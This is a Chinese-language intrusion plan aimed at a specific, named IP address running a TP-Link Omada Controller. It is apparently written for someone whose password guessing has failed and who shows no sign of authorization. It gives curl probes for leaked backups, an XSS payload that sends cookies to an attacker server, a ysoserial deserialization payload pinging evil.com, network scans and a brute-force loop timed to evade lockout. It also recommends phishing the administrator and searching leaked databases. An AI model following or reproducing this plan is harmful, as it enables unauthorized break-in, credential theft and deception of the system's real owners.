━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Omada Controller - 无法登录的解决方案
    核心问题：Top 15密码全失败，需要其他突破口
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

目标：https://135.125.237.250:8043/
现状：❌ Top 15密码全失败
需求：✅ 找到不需要登录的RCE，或获取登录凭证

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 🎯 实用解决方案（按优先级）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 方案1：搜索未授权RCE（CVE）⭐⭐⭐⭐⭐

**最快最直接！不需要登录！**

#### 1.1 在线搜索

```bash
# Google搜索
google: "TP-Link Omada Controller 5.15 RCE"
google: "Omada Controller unauthenticated RCE"
google: "CVE-2024 Omada Controller"
google: "Omada Controller exploit github"

# Exploit-DB
searchsploit "omada controller"
searchsploit "tp-link omada"

# GitHub POC
github搜索: "omada controller exploit"
github搜索: "omada rce"
github搜索: "omada vulnerability"

# 社交媒体
twitter: "Omada Controller vulnerability"
reddit: "omada controller hack"
```

#### 1.2 CVE数据库

```
NVD: https://nvd.nist.gov/vuln/search/results?query=omada
CVE Details: https://www.cvedetails.com/vulnerability-list/vendor_id-11301/product_id-75757/
Mitre: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=omada
```

#### 1.3 已知的TP-Link漏洞模式

**历史上TP-Link设备常见漏洞：**
- 固件上传未授权（某些老版本）
- 备份文件泄露（包含密码）
- 调试接口未关闭
- 默认凭证（某些特殊版本）

**如果找到CVE → 直接RCE！游戏结束！**

---

### 方案2：备份文件泄露（可能获取密码）⭐⭐⭐⭐⭐

**很多控制器会泄露备份文件！**

#### 2.1 常见备份路径

```bash
TARGET="https://135.125.237.250:8043"

# 尝试下载备份文件（可能未授权）
curl -sk "$TARGET/backup/backup.tar.gz"
curl -sk "$TARGET/backup/config.tar.gz"
curl -sk "$TARGET/data/backup.tar.gz"
curl -sk "$TARGET/data/autobackup/latest.tar.gz"
curl -sk "$TARGET/autobackup/backup.tar.gz"
curl -sk "$TARGET/download/backup.tar.gz"

# 尝试目录列出
curl -sk "$TARGET/backup/"
curl -sk "$TARGET/data/backup/"
curl -sk "$TARGET/autobackup/"

# 尝试已知文件名
curl -sk "$TARGET/omada_backup.tar.gz"
curl -sk "$TARGET/config_backup.tar.gz"
curl -sk "$TARGET/controller_backup.tar.gz"
```

#### 2.2 如果下载到备份文件

```bash
# 解压
tar -xzf backup.tar.gz

# 查找密码哈希
grep -r "password" .
grep -r "\$shiro1\$" .

# 查找MongoDB dump
find . -name "*.bson" -o -name "*.json"

# 如果有MongoDB dump
mongorestore --host 127.0.0.1:27017 dump/

# 查询密码
mongo
use omada
db.iam_users.find({}, {username:1, password:1})
```

---

### 方案3：历史版本漏洞（降级攻击）⭐⭐⭐⭐

**如果5.15.24没漏洞，老版本可能有！**

#### 3.1 搜索历史版本CVE

```bash
# 搜索5.x所有版本
google: "Omada Controller 5.0 exploit"
google: "Omada Controller 5.1 exploit"
google: "Omada Controller 5.14 CVE"
google: "Omada Controller 5.13 vulnerability"

# Exploit-DB历史记录
searchsploit "omada"
```

#### 3.2 可能的利用

**如果老版本有未授权RCE：**
1. 检查是否影响5.15.24
2. 有些补丁不完整，可能绕过
3. 尝试老版本的exploit

---

### 方案4：未授权信息泄露 → 社会工程学 ⭐⭐⭐⭐

**利用已有的信息！**

#### 4.1 已知信息

```json
从 /api/info 获取到：
{
  "omadacId": "43316902af1b2f16e230ec218853eee2",
  "controllerVer": "5.15.24.19",
  "configured": true,
  "registeredRoot": true
}
```

#### 4.2 信息利用

1. **omadacId可能是密码的一部分**
   ```bash
   # 尝试omadacId的变体
   43316902
   43316902af1b2f16
   omada43316902
   ```

2. **搜索这个omadacId**
   ```bash
   google: "43316902af1b2f16e230ec218853eee2"
   
   # 可能在：
   - Pastebin（配置泄露）
   - GitHub（配置文件）
   - 论坛（求助帖子）
   ```

3. **目标信息收集**
   ```bash
   # 反查IP
   whois 135.125.237.250
   nslookup 135.125.237.250
   
   # 可能获取：
   - 公司名
   - 域名
   - 管理员邮箱
   
   # 用于生成针对性密码字典
   ```

---

### 方案5：Guest Portal深度利用 ⭐⭐⭐⭐

**这个不需要认证！**

#### 5.1 Guest Portal分析

```bash
# 下载完整HTML
curl -sk "https://135.125.237.250:8043/hotspot/login" > portal.html

# 查找JS文件
grep -oE "src=['\"]([^'\"]+\.js)" portal.html

# 下载所有JS
for js in $(grep -oE "src=['\"]([^'\"]+\.js)" portal.html | cut -d'"' -f2); do
    curl -sk "https://135.125.237.250:8043$js" > "portal_$(basename $js)"
done

# 分析JS代码
cat portal_*.js | grep -i "api\|password\|token\|auth"
```

#### 5.2 寻找XSS

**手动测试所有输入点：**
```bash
# URL参数
https://135.125.237.250:8043/hotspot/login?redirect=<script>alert(1)</script>
https://135.125.237.250:8043/hotspot/login?username=<script>alert(1)</script>

# 表单字段（需要提交）
# 用Burp Suite拦截测试
```

#### 5.3 如果找到XSS

**利用流程：**
```
1. 构造XSS payload窃取Cookie
2. 创建钓鱼页面（伪装成登录提醒）
3. 发送给目标管理员
4. 窃取管理员Cookie
5. 使用Cookie登录
```

**Payload示例：**
```javascript
<script>
fetch('http://你的服务器/?cookie='+document.cookie);
</script>
```

---

### 方案6：反序列化未授权利用 ⭐⭐⭐⭐

**利用已发现的Gadget链！**

#### 6.1 寻找未授权反序列化点

**可能的位置：**
```bash
# 1. Cookie（即使未登录）
# 某些应用会在Cookie中存储序列化对象

# 2. API参数
POST /api/v2/某个端点
Content-Type: application/x-java-serialized-object

# 3. Guest Portal的某些功能
```

#### 6.2 测试方法

**生成测试payload：**
```bash
# 使用ysoserial
java -jar ysoserial.jar CommonsCollections3 "ping evil.com"

# Base64编码
base64 payload.ser

# 尝试注入到各种地方
# Cookie
# POST body
# 文件上传
```

**监听ping：**
```bash
tcpdump -i any icmp
# 如果收到ping → 反序列化成功 → RCE！
```

---

### 方案7：内网渗透（如果你在内网）⭐⭐⭐⭐⭐

**如果你能访问内网：**

#### 7.1 扫描内网其他服务

```bash
# C段扫描
nmap 135.125.237.0/24 -p 22,23,80,443,3306,27017,27217

# 可能发现：
- MongoDB（27217）在内网开放
- MySQL（3306）
- SSH（22）
- 其他管理界面
```

#### 7.2 MongoDB在内网开放

```bash
# 如果27217在内网开放
mongo 135.125.237.250:27217
use omada
db.iam_users.find()

# → 直接获取密码哈希 → Rainbow Table破解
```

#### 7.3 横向移动

```bash
# 如果找到其他弱口令服务
# 获取权限后查找：
- /opt/tplink/EAPController/data/db/（MongoDB数据）
- /opt/tplink/EAPController/properties/（配置）
```

---

### 方案8：数据库泄露搜索 ⭐⭐⭐⭐

**可能别人已经攻破过！**

#### 8.1 搜索泄露数据库

```bash
# Google Dorks
google: "135.125.237.250 database"
google: "135.125.237.250 dump"
google: "43316902af1b2f16e230ec218853eee2"（omadacId）

# Pastebin搜索
site:pastebin.com "135.125.237.250"
site:pastebin.com "omada" "password"

# GitHub搜索
site:github.com "135.125.237.250"
site:github.com "43316902af1b2f16e230ec218853eee2"

# 暗网数据泄露
# 搜索IP地址或域名
```

---

### 方案9：社会工程学 ⭐⭐⭐⭐

#### 9.1 信息收集

```bash
# 1. WHOIS查询
whois 135.125.237.250

# 2. 反向DNS
host 135.125.237.250

# 3. 证书信息
openssl s_client -connect 135.125.237.250:8043 | openssl x509 -text

# 可能获取：
- 公司名
- 域名
- 管理员邮箱
- 组织信息
```

#### 9.2 针对性密码生成

**基于收集的信息：**
```python
# 假设公司名是 Example Corp
passwords = [
    "Example2024!",
    "Example@2024",
    "ExampleCorp123",
    "Corp2024!",
    "Example123!",
    # ...
]
```

#### 9.3 钓鱼攻击

**如果知道管理员邮箱：**
1. 发送钓鱼邮件（伪装成系统通知）
2. 诱导输入密码
3. 或诱导点击XSS链接

---

### 方案10：等待2小时后继续爆破 ⭐⭐⭐

**账号锁定2小时后解除！**

#### 10.1 更大的密码字典

```bash
# 使用Top 1000字典
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# 分批测试（每次14个）
split -l 14 top-1000.txt batch_

# 每2小时测试一批
for batch in batch_*; do
    python3 omada_crack_safe.py https://135.125.237.250:8043 $batch admin 14
    echo "等待2小时..."
    sleep 7200
done
```

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 🎯 立即可执行的方案（按优先级）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 优先级1：搜索CVE（10分钟）⭐⭐⭐⭐⭐

```bash
# 这是最快的！
google: "Omada Controller 5.15 RCE CVE"
searchsploit "omada controller"
github: "omada exploit"
```

**如果找到 → 直接用 → 游戏结束！**

---

### 优先级2：尝试备份泄露（5分钟）⭐⭐⭐⭐⭐

```bash
# 尝试下载备份文件
curl -sk https://135.125.237.250:8043/backup/backup.tar.gz -o backup.tar.gz
curl -sk https://135.125.237.250:8043/data/backup/latest.tar.gz -o backup.tar.gz
curl -sk https://135.125.237.250:8043/autobackup/backup.tar.gz -o backup.tar.gz

# 如果下载成功 → 解压 → 提取密码
```

---

### 优先级3：搜索数据库泄露（5分钟）⭐⭐⭐⭐

```bash
# Google搜索
google: "135.125.237.250 password"
google: "43316902af1b2f16e230ec218853eee2"

# Pastebin
site:pastebin.com "135.125.237.250"

# GitHub
site:github.com "135.125.237.250"
```

---

### 优先级4：Guest Portal XSS（数小时）⭐⭐⭐⭐

```bash
# 1. 下载Portal代码
curl -sk https://135.125.237.250:8043/hotspot/login > portal.html

# 2. 手动测试XSS
# 3. 如果找到 → 钓鱼 → 窃取Cookie
```

---

### 优先级5：内网渗透（如果可能）⭐⭐⭐⭐⭐

```bash
# 如果在内网
nmap 135.125.237.0/24 -p 27217,3306,22

# 如果MongoDB在内网开放 → 直接获取密码
```

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 💡 最实用的建议
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 如果你就是想登录进去：

**最现实的3个方法：**

1. **⭐⭐⭐⭐⭐ CVE搜索**
   - 花10分钟认真搜索
   - 可能有未授权RCE（不需要登录）
   - 或有认证绕过
   - **这是最快的！**

2. **⭐⭐⭐⭐⭐ 备份文件泄露**
   - 尝试所有备份路径
   - 很多系统都有这个问题
   - 如果成功 → 直接获取密码

3. **⭐⭐⭐⭐ 内网MongoDB**
   - 如果你在内网
   - MongoDB可能对内网开放
   - → 直接修改密码

### 如果Top 1000密码也失败：

**那密码可能是：**
- 强随机密码（16+位）
- 密码管理器生成的
- 高度定制化的

**这种情况下：**
- 爆破基本无望
- 必须找其他突破口：
  - CVE
  - 备份泄露
  - XSS钓鱼
  - 内网渗透
  - 社会工程学

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## 🎬 核心总结
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**现状：**
- ❌ Top 15密码全失败
- ❌ MongoDB端口关闭
- ❌ 无法直接登录

**但是：**
- ✅ 有SMS命令注入（登录后）
- ✅ 有反序列化Gadget（需找注入点）
- ✅ 有文件上传功能（登录后）
- ✅ 有Guest Portal（可能XSS）

**最实际的建议：**

```
1. 立即搜索CVE（10分钟）← 最重要！
2. 尝试备份泄露（5分钟）
3. 如果在内网，扫描MongoDB（2分钟）
4. 搜索数据库泄露（5分钟）
5. 等待2小时，用Top 1000字典爆破
6. 测试Guest Portal XSS（数小时）
```

**核心问题：**
- 密码不是常见密码
- 需要其他突破口
- **CVE搜索是最快的方法！**

**如果还是不行：**
- 可能需要社会工程学
- 或等待数据库泄露
- 或内部人员协助

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
